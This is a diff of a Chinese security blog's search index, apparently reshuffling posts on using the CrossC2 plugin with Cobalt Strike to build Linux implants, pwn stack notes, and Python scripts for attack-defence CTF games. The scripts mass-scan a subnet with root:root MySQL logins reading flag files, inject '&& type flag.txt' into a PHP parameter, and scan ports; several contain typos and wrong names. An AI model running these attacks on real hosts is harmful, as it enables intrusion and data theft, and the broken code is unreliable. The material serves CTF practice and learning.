@@ -8,7 +8,7 @@
       <link href="/2020/07/10/Mark-OnceBuild-CrossC2Object/"/>
       <url>/2020/07/10/Mark-OnceBuild-CrossC2Object/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>在公司项目上，帮客户测试内网安全，有一个linux系统，然后cs生成不了Linux🐎，于是我就找到了CrossC2插件，但是呢，CrossC2有一些有点问题，这里记一次使用CrossC2的<strong>踩坑记</strong></p><a id="more"></a><h1 id="0x01-CrossC2-介绍">0x01 CrossC2 介绍</h1><p>CrossC2 是一款，可以生成 Linux / MacOS 的🐎，蛮强的</p><h1 id="0x02-CrossC2-使用">0x02 CrossC2 使用</h1><p>从Github上面git clone 下来有三个文件，Linux后缀是生成Linux🐎 则 MacOS就是苹果系统的🐎</p><p><img src="1.png" alt="1"></p><p>CrossC2.cna 是Cobalt Strike 的插件。最主要要改动的地方是 77行。之后在CS上加上插件就能看到了。</p><p>我是不推荐从插件里生成拉，那样生成的不是很有效果。</p><p><img src="2.png" alt="2"></p><p>大部分我都是直接使用主程序生成🐎。CrossC2都会给你默认参数，第一个默认的就已经很常用了</p><p><img src="3-1594619515456.png" alt="3"></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>重要的事情说三遍</strong></p><h1 id="0x03-CrossC2的坑">0x03 CrossC2的坑</h1><p><img src="4.png" alt="4"></p><p><img src="5.png" alt="5"></p><p>开启cs，监听https，坑就在这里</p><p>CrossC2 走的必须是https 才能回显</p><p><img src="6.png" alt="6"></p><p><img src="7-1594620514222.png" alt="7"></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>在公司项目上，帮客户测试内网安全，有一个linux系统，然后cs生成不了Linux🐎，于是我就找到了CrossC2插件，但是呢，CrossC2有一些有点问题，这里记一次使用CrossC2的<strong>踩坑记</strong></p><a id="more"></a><h1 id="0x01-CrossC2-介绍">0x01 CrossC2 介绍</h1><p>CrossC2 是一款，可以生成 Linux / MacOS 的🐎，蛮强的</p><h1 id="0x02-CrossC2-使用">0x02 CrossC2 使用</h1><p>从Github上面git clone 下来有三个文件，Linux后缀是生成Linux🐎 则 MacOS就是苹果系统的🐎</p><p><img src="1.png" alt="1"></p><p>CrossC2.cna 是Cobalt Strike 的插件。最主要要改动的地方是 77行。之后在CS上加上插件就能看到了。</p><p>我是不推荐从插件里生成拉，那样生成的不是很有效果。</p><p><img src="2.png" alt="2"></p><p>大部分我都是直接使用主程序生成🐎。CrossC2都会给你默认参数，第一个默认的就已经很常用了</p><p><img src="3-1594619515456.png" alt="3"></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>重要的事情说三遍</strong></p><h1 id="0x03-CrossC2的坑">0x03 CrossC2的坑</h1><p><img src="4.png" alt="4"></p><p><img src="5.png" alt="5"></p><p>开启cs，监听https，坑就在这里</p><p>CrossC2 走的必须是https 才能回显</p><p><img src="6.png" alt="6"></p><p><img src="7.png" alt="7"></p>]]></content>
       
       
       
@@ -214,11 +214,11 @@
     
     
     <entry>
-      <title>【Pwn】学习笔记第一期:栈知识</title>
-      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
-      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
+      <title>【Pwn】学习笔记第零期:开端</title>
+      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
+      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><a id="more"></a><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><a id="more"></a><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -241,11 +241,11 @@
     
     
     <entry>
-      <title>【Pwn】学习笔记第零期:开端</title>
-      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
-      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
+      <title>【Pwn】学习笔记第一期:栈知识</title>
+      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
+      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><a id="more"></a><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><a id="more"></a><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -495,31 +495,6 @@
     
     
     <entry>
-      <title>【PythonScript】:PyMySQL</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>【PythonScript】:WebShell</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
@@ -570,31 +545,6 @@
     
     
     <entry>
-      <title>【PythonScript】:WebShell_urilb</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>【PythonScript】:RemoteSocket_cmd</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
@@ -620,11 +570,61 @@
     
     
     <entry>
+      <title>【PythonScript】:PyMySQL</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【PythonScript】:PortScanner</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
       
         <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【PythonScript】:WebShell_urilb</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
